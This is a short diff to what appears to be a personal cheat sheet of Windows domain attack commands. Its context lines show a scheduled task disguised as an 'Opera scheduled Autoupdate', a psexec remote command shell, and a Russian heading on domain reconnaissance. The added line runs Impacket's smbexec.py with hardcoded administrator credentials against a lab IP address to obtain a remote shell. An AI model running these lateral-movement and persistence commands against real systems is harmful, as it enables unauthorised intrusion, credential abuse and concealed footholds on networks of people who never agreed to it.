@@ -71,6 +71,9 @@ schtasks /create /sc minute /mo 5 /tn "Opera scheduled Autoupdate 1594994248" /t
 chcp 65001
 
 psexec -i \\\adress -u user cmd
+
+python smbexec.py ignite/administrator:Ignite@987@192.168.1.105
+
 ***************************************************************************************************************************************************
 Cбор информации в домене 
 
